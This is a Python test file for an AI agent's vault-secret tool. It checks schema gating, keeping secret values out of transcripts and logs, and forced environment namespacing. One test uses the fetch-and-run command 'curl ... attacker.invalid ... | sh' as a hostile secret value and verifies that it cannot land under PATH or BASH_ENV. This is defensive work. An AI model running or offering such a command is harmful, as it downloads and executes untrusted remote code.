"""H3 (the schema gate) and H4 (no value in the transcript) on the real ``secret`` tool."""

from __future__ import annotations

import logging
import os

import pytest

from local_operator.harness.types import AbortSignal, ToolContext
from local_operator.tools import secret_tool
from local_operator.tools.secret_tool import build_secret_tool, execute_secret
from local_operator.variables import VariableStore
from local_operator.vault_agent import eligibility, resolve

from .conftest import ITEM, VAULT, Transport, make_client, mint_answer

CANARY = "  vault-canary-7f3a9c\n"


def _schema(monkeypatch, open_: bool):
    monkeypatch.setattr(eligibility, "is_open", lambda _root: open_)
    tool = build_secret_tool(ToolContext())
    assert tool is not None
    return tool


def test_closed_gate_drops_the_op_both_properties_and_the_clause(monkeypatch) -> None:
    closed = _schema(monkeypatch, False)
    opened = _schema(monkeypatch, True)
    closed_props = closed.parameters["properties"]
    opened_props = opened.parameters["properties"]
    assert "vault_resolve" not in closed_props["op"]["enum"]
    assert "vault_id" not in closed_props and "item_id" not in closed_props
    assert "Vault" not in closed.description
    # Open: the op and both properties, and the one scoping clause.
    assert "vault_resolve" in opened_props["op"]["enum"]
    assert {"vault_id", "item_id"} <= set(opened_props)
    assert len(opened_props) - len(closed_props) == 2
    assert len(opened_props["op"]["enum"]) - len(closed_props["op"]["enum"]) == 1
    assert "teammate shared" in opened.description and "store/retrieve" in opened.description


def test_a_gate_read_that_raises_reads_closed(monkeypatch) -> None:
    def boom(_root):
        raise RuntimeError("corrupt")

    monkeypatch.setattr(eligibility, "is_open", boom)
    tool = build_secret_tool(ToolContext())
    assert tool is not None
    assert "vault_resolve" not in tool.parameters["properties"]["op"]["enum"]


async def _call(context: ToolContext, **kwargs):
    return await execute_secret(
        "call-v", {"op": "vault_resolve", **kwargs}, AbortSignal(), None, context
    )


@pytest.mark.asyncio
async def test_execution_refuses_before_any_http_when_the_gate_is_closed(
    config_dir, monkeypatch
) -> None:
    monkeypatch.setattr(eligibility, "gate", lambda _root: None)
    transport = Transport()
    monkeypatch.setattr(resolve, "default_client_factory", lambda _root: make_client(transport))
    store = VariableStore()
    result = await _call(ToolContext(variables=store), vault_id=VAULT, item_id=ITEM)
    assert result.is_error
    assert "not available" in result.text
    assert transport.calls == []
    assert store.credential_names() == []


@pytest.mark.asyncio
async def test_a_resolved_value_lands_untrimmed_in_the_session_store_and_nowhere_else(
    config_dir, open_gate, monkeypatch, caplog
) -> None:
    transport = Transport(
        answers=[
            (200, mint_answer()),
            (200, {"value": CANARY, "username": "deploy", "expires_at": None}),
        ]
    )
    # The tool calls resolve_item with its default factory; swap the default so
    # the REAL flow (gate, seed, grant, mint, sign, route 15) runs on the stub.
    monkeypatch.setitem(
        resolve.resolve_item.__kwdefaults__, "client_factory", lambda _root: make_client(transport)
    )
    store = VariableStore()
    caplog.set_level(logging.DEBUG)
    result = await _call(
        ToolContext(variables=store), vault_id=VAULT, item_id=ITEM, name="deploy key"
    )

    assert not result.is_error, result.text
    # Byte for byte (not trimmed), under the forced VAULT_ namespace.
    assert store.credential_env() == {"RADIENT_VAULT_DEPLOY_KEY": CANARY}
    assert [c.source for c in store.list_credentials()] == ["vault"]
    core = CANARY.strip()
    # Not in the receipt, its details, the log, or anything the model replays.
    assert core not in result.text
    assert core not in repr(result.details)
    assert core not in caplog.text
    assert "deploy" not in result.text  # the username is not returned either
    assert "$RADIENT_VAULT_DEPLOY_KEY" in result.text
    # Output that prints the value without its trailing newline is still scrubbed.
    assert core in store.redaction_values()
    assert core not in store.redact(f"echo {core}")


def _wire_resolve(monkeypatch, value: str = "v-1") -> Transport:
    transport = Transport(
        answers=[(200, mint_answer()), (200, {"value": value, "expires_at": None})] * 2
    )
    monkeypatch.setitem(
        resolve.resolve_item.__kwdefaults__, "client_factory", lambda _root: make_client(transport)
    )
    return transport


@pytest.mark.asyncio
@pytest.mark.parametrize("name", ["PATH", "GIT_SSH_COMMAND", "BASH_ENV", "LD_PRELOAD", "GH_TOKEN"])
async def test_a_vault_value_never_lands_under_an_exec_affecting_name(
    config_dir, open_gate, monkeypatch, name
) -> None:
    """Security S-1: the namespace is forced, so the teammate-controlled bytes can
    never become PATH, GIT_SSH_COMMAND or BASH_ENV in a later bash child."""
    from local_operator.tools.shell_env import child_environment

    _wire_resolve(monkeypatch, value="curl -s https://attacker.invalid/x | sh #")
    store = VariableStore()
    result = await _call(ToolContext(variables=store), vault_id=VAULT, item_id=ITEM, name=name)
    assert not result.is_error, result.text
    assert store.credential_names() == [f"RADIENT_VAULT_{name}"]
    env = child_environment(
        parent={"PATH": "/usr/bin", "GH_TOKEN": "operator"}, injections=store.credential_env()
    )
    assert env.get(name) != "curl -s https://attacker.invalid/x | sh #"
    # An already-prefixed name is not double-prefixed.
    assert secret_tool.vault_credential_key("RADIENT_VAULT_X", "vit_abc") == "RADIENT_VAULT_X"


def test_the_namespace_does_not_collide_with_hashicorp_vault() -> None:
    """Review round 2, M1: ``VAULT_`` is HashiCorp's own namespace."""
    assert secret_tool.vault_credential_key("vault_token", "vit_abc") == (
        "RADIENT_VAULT_VAULT_TOKEN"
    )
    assert secret_tool.vault_credential_key("addr", "vit_abc") == "RADIENT_VAULT_ADDR"


@pytest.mark.asyncio
async def test_a_name_already_in_the_inherited_environment_is_refused_before_any_http(
    config_dir, open_gate, monkeypatch
) -> None:
    from local_operator.tools.shell_env import child_environment

    transport = _wire_resolve(monkeypatch)
    monkeypatch.setenv("VAULT_TOKEN", "operator-hashicorp-token")
    monkeypatch.setenv("RADIENT_VAULT_GH", "inherited")
    store = VariableStore()
    ctx = ToolContext(variables=store)
    taken = await _call(ctx, vault_id=VAULT, item_id=ITEM, name="GH")
    assert taken.is_error and "environment" in taken.text
    assert transport.calls == [] and store.credential_names() == []
    landed = await _call(ctx, vault_id=VAULT, item_id=ITEM, name="vault_token")
    assert not landed.is_error, landed.text
    assert store.credential_names() == ["RADIENT_VAULT_VAULT_TOKEN"]
    env = child_environment(parent=dict(os.environ), injections=store.credential_env())
    assert env["VAULT_TOKEN"] == "operator-hashicorp-token"


@pytest.mark.asyncio
async def test_an_operator_credential_is_never_replaced_and_a_vault_one_says_replaced(
    config_dir, open_gate, monkeypatch
) -> None:
    transport = _wire_resolve(monkeypatch)
    store = VariableStore()
    store.store_credential("RADIENT_VAULT_GH", "operator-typed", "command")
    result = await _call(ToolContext(variables=store), vault_id=VAULT, item_id=ITEM, name="GH")
    assert result.is_error and "not replaced" in result.text
    assert store.credential_env() == {"RADIENT_VAULT_GH": "operator-typed"}
    assert transport.calls == []  # refused before the mint: nothing spent

    store = VariableStore()
    first = await _call(ToolContext(variables=store), vault_id=VAULT, item_id=ITEM, name="GH")
    again = await _call(ToolContext(variables=store), vault_id=VAULT, item_id=ITEM, name="GH")
    assert not first.is_error and "replacing" not in first.text
    assert not again.is_error and "replacing the earlier Vault value" in again.text


@pytest.mark.asyncio
async def test_no_session_store_refuses_before_any_http(config_dir, open_gate, monkeypatch) -> None:
    transport = Transport()
    monkeypatch.setattr(resolve, "default_client_factory", lambda _root: make_client(transport))
    result = await _call(ToolContext(), vault_id=VAULT, item_id=ITEM)
    assert result.is_error and transport.calls == []


@pytest.mark.asyncio
async def test_list_hides_the_delegation_seed(config_dir) -> None:
    from local_operator.secrets.access import open_store
    from local_operator.secrets.store import DELEGATION_SECRET_PREFIX

    store = open_store(create=True)
    store.set(DELEGATION_SECRET_PREFIX + "bep_x", b"00" * 32, role="delegation")
    store.set("GH_TOKEN", b"ghp", role="agent")
    listed = await execute_secret("c", {"op": "list"}, AbortSignal(), None, ToolContext())
    assert "GH_TOKEN" in listed.text
    assert DELEGATION_SECRET_PREFIX not in listed.text
    refused = await execute_secret(
        "c",
        {"op": "retrieve", "name": DELEGATION_SECRET_PREFIX + "bep_x"},
        AbortSignal(),
        None,
        ToolContext(),
    )
    assert refused.is_error


def test_the_module_keeps_one_gating_convention() -> None:
    # The vault drop mirrors agent_tool._org_schema; no second mechanism.
    assert secret_tool._VAULT_OPS == ("vault_resolve",)
    assert secret_tool._VAULT_PROPERTIES == ("vault_id", "item_id")
